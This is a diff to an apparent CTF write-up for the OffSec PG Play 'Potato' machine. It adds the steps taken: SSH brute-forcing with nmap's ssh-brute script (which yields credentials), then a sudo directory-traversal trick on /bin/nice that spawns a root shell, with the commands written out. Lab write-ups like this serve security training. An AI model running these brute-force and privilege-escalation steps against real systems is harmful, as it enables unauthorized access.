@@ -2,7 +2,7 @@
 title: "OffSec - PG Play - Linux - Easy - Potato"
 date: 2025-11-12 12:00:00 -0000
 categories: [CTF, OffSec PG Play]
-tags: [linux, easy]
+tags: [linux, easy, bruteforce, ssh, sudo -l, directory traversal]
 ---
 
 ![OffSec PG Play Potato](/assets/img/ctf/offsec/easy/potato/potato.png)
@@ -13,6 +13,9 @@ tags: [linux, easy]
 
 # tl;dr
 <details><summary>Spoilers</summary>
+* bruteforce SSH using NMAP
+* check user's sudo permissions after SSH foothold
+* Use directory traversal when invoking the sudo command to a payload to get a root shell
 </details>
 
 # Attack Path
@@ -143,6 +146,50 @@ There's a password *potato* listed. I'll throw that in *passwords.txt* and see i
 
 ## Foothold
 
+I tried multiple attacks by intercepting the login POST data, but could not get inside the dashboard. I tried bruteforcing the login page, FTP, and SSH for the admin user and even tried potato as a user, but did not succeed. 
+
+I ended up letting a bruteforce run while I continued to find a vector. By pure chance, I got creds with user (
+
+```bash
+┌──(haunter㉿kali)-[~/working/offsec/easy/potato
+└─$ nmap -p22 --script=/usr/share/nmap/scripts/ssh-brute.nse $potato
+....
+
+webadmin:dragon
+```
+
+I have NO IDEA if this was the intended foothold vector. I SSH'd in to get the foothold.
+
 ## Lateral Movement / Privilege Escalation
 
+N/A
+
 ## Root / SYSTEM
+
+First I enumerated sudo permissions with *sudo -l*. The user could run */bin/nice* on files within */notes/*.
+
+```bash
+[sudo] password for webadmin: 
+Matching Defaults entries for webadmin on serv:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on serv:
+    (ALL : ALL) /bin/nice /notes/*
+```
+
+```bash
+webadmin@serv:~$ echo "/bin/bash" > privesc.sh
+webadmin@serv:~$ chmod +x privesc.sh 
+webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/privesc.sh 
+root@serv:/home/webadmin# ls /root
+proof.txt  root.txt  snap
+root@serv:/home/webadmin# cat /root/proof.txt
+REDACTED
+
+Got root and proof.txt flag.
+```
+## Lessons Learned
+* PHP commands such as cmpstr() can be vulnerable if we can intercept request traffic. A POST var such as 'password' can be changed to 'password[]', for example.
+* NMAP's bruteforce can be useful against services such as SSH if we have no username/password and are desperate
+* a sudo command that is restricted to a directoy (e.g. /bin/nice /notes/* is restricted to be run on files ONLY in the /notes/ dir), we can try directory traversal to abuse the sudo priv. E.g., sudo /bin/nice /notes/../home/webadmin/payload.sh
